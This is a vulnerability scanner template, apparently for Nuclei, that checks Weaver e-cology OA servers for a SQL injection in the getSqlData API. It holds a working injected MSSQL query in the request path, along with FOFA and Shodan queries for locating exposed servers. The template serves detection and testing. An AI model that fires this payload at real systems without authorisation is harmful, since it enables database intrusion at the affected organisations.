http:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5(num)}}'
  - condition: and
    part: body
    type: word
    words:
    - '{"api_status":'
    - '"status":true}'
  method: GET
  path:
  - '{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes(''MD5'',''{{num}}'')),3,32)'
  - '{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql='
  stop-at-first-match: true
id: weaver-ecology-getsqldata-sqli
info:
  author: SleepingBag945
  classification:
    cpe: cpe:2.3:a:weaver:e-cology:*:*:*:*:*:*:*:*
  description: 'When the getSqlData interface of the Panwei e-cology OA system uses
    the mssql database, the built-in SQL statements are not spliced strictly, resulting
    in a SQL injection vulnerability.

    '
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-\u534F\u540C\u529E\u516COA\""
    max-request: 2
    product: e-cology
    shodan-query: ecology_JSessionid
    vendor: weaver
    verified: true
  name: Weaver E-Cology `getsqldata` - SQL Injection
  reference:
  - https://github.com/Wrin9/weaverOA_sql_RCE/blob/14cca7a6da7a4a81e7c7a7016cb0da75b8b290bc/weaverOA_sql_injection_POC_EXP.py#L46
  severity: high
  tags: ecology,weaver,oa,sqli,vuln
variables:
  num: '999999999'
